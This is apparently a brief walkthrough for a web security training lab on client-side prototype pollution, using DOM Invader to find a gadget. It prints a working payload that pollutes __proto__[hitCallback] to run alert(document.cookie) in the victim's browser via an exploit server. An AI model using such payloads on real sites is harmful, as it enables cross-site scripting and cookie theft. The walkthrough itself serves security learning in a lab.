
> This lab are based on the following research: https://portswigger.net/research/widespread-prototype-pollution-gadgets

1. Using DOM invader, verify the gadgets;

![](/static/img/Pasted_image_20231202092130.png)
2. Click on  exploit, after the scan is completed;

![](/static/img/Pasted_image_20231202092228.png)

3. Go to exploit server and paste the following payload;

```javascript
<script> location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29" </script>
```

4. Send the exploit to the victim;

![](/static/img/Pasted_image_20231202092436.png)

